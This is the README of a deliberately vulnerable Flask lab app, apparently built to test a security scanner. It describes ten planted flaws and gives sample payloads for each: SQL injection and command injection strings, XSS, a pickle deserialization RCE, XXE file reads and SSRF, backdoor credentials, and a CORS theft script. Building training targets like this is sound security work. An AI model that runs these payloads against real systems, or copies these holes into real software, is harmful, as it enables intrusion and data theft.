# Vulnerable Web Application

🚨 **WARNING: This application contains intentional security vulnerabilities for authorized security testing and educational purposes only.**

A deliberately vulnerable web application built with Flask for testing the kimi ecosystem. This application demonstrates common web security vulnerabilities.

## Quick Start

### Using Docker

```bash
# Build the image
docker build -t vuln-app .

# Run the container
docker run -p 5000:5000 vuln-app
```

### Manual Setup

```bash
# Install dependencies
pip install flask

# Run the application
python app.py
```

The application will be available at `http://localhost:5000`

## Default Credentials

| Username | Password  | Role  |
|----------|-----------|-------|
| admin    | admin123  | Admin |
| user1    | password123| User |
| user2    | password456| User |

**Backdoor credentials:** `backdoor` / `backdoor123`

## Vulnerabilities

### 1. SQL Injection (Login Form)

**Location:** `/login`

**Vulnerability:** The login form constructs SQL queries using string concatenation without parameterization.

**Exploitation:**
```
Username: ' OR '1'='1
Password: anything
```

This bypasses authentication by making the SQL query always return true:
```sql
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = 'anything'
```

**Impact:** Authentication bypass, data extraction

---

### 2. Command Injection (Ping Utility)

**Location:** `/ping`

**Vulnerability:** User input is directly passed to `subprocess.check_output()` with `shell=True`.

**Exploitation:**
```
Host: google.com; cat /etc/passwd
Host: google.com && whoami
Host: google.com; ls -la
```

**Impact:** Remote code execution, system compromise

---

### 3. Cross-Site Scripting (XSS)

**Location:** `/comments`, `/search`

**Vulnerability:** User input is rendered without HTML escaping using `| safe` filter.

**Exploitation:**
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
```

**Impact:** Session hijacking, credential theft, malware distribution

---

### 4. Insecure Deserialization

**Location:** `/profile`

**Vulnerability:** The application uses `pickle.loads()` on user-supplied data without validation.

**Exploitation:**
```python
import pickle
import base64

# Create malicious payload
class Exploit:
    def __reduce__(self):
        import os
        return (os.system, ('whoami',))

payload = pickle.dumps(Exploit())
# Submit the payload in the profile form with format="pickle"
```

**Impact:** Remote code execution

---

### 5. Insecure Direct Object Reference (IDOR)

**Location:** `/document/<id>`

**Vulnerability:** Documents are accessed by ID without verifying ownership or authorization.

**Exploitation:**
```
# Logged in as user2, access admin's private document
GET /document/1
```

**Impact:** Unauthorized data access, information disclosure

---

### 6. Weak Authentication

**Location:** `/login`, `/api/login`

**Vulnerabilities:**
- Hardcoded backdoor credentials (`backdoor`/`backdoor123`)
- No rate limiting on login attempts
- No account lockout mechanism
- Weak password policy

**Exploitation:**
```bash
# Brute force with no rate limiting
curl -X POST http://localhost:5000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin123"}'

# Use backdoor
curl -X POST http://localhost:5000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"backdoor","password":"backdoor123"}'
```

**Impact:** Account takeover, unauthorized access

---

### 7. Unrestricted File Upload

**Location:** `/upload`

**Vulnerability:** No file extension validation, no content type checking, no size limits.

**Exploitation:**
```bash
# Upload a malicious HTML file with JavaScript
curl -X POST -F "file=@malicious.html" http://localhost:5000/upload

# Upload a PHP shell (if PHP is enabled)
curl -X POST -F "file=@shell.php" http://localhost:5000/upload
```

**Impact:** Remote code execution, XSS, malware hosting

---

### 8. XML External Entity (XXE) Injection

**Location:** `/xml`

**Vulnerability:** XML parser processes external entities without restrictions.

**Exploitation:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>
```

**Advanced exploitation (SSRF):**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal.service/secret">
]>
<root><data>&xxe;</data></root>
```

**Impact:** File disclosure, SSRF, DoS

---

### 9. Information Disclosure

**Locations:**
- `/debug` - Exposes app config, environment variables, routes
- `/.git/config` - Exposes repository information
- Stack traces (DEBUG mode enabled)

**Exploitation:**
```bash
# Get debug information
curl http://localhost:5000/debug

# Access git config
curl http://localhost:5000/.git/config

# Trigger an error to see stack traces
curl http://localhost:5000/nonexistent
```

**Impact:** Information leakage aiding further attacks

---

### 10. CORS Misconfiguration

**Location:** All endpoints (via `after_request` handler)

**Vulnerability:**
- `Access-Control-Allow-Origin: *` (wildcard)
- `Access-Control-Allow-Credentials: true`

This dangerous combination allows any website to make authenticated requests.

**Exploitation:**
```javascript
// From any malicious website
fetch('http://localhost:5000/debug', {
    credentials: 'include'
})
.then(r => r.json())
.then(data => console.log(data));
```

**Impact:** CSRF bypass, data theft from authenticated users

---

## Testing with Kimi

This application is designed to test the kimi ecosystem's security scanning capabilities. Each vulnerability is clearly marked and includes exploitation hints.

### Example Test Scenarios

1. **SQL Injection Detection:**
   - Test login form with various payloads
   - Verify time-based blind SQLi detection

2. **XSS Detection:**
   - Test comment form with script tags
   - Verify DOM-based XSS in search parameter

3. **Command Injection:**
   - Test ping utility with command chaining

4. **Authentication Testing:**
   - Test for weak credentials
   - Verify backdoor detection

## Security Notice

⚠️ **DO NOT deploy this application in production or on publicly accessible servers.**

This application is intentionally vulnerable and should only be used:
- In isolated development environments
- For authorized security testing
- For educational purposes
- With proper network segmentation

## License

This project is for educational and authorized security testing purposes only.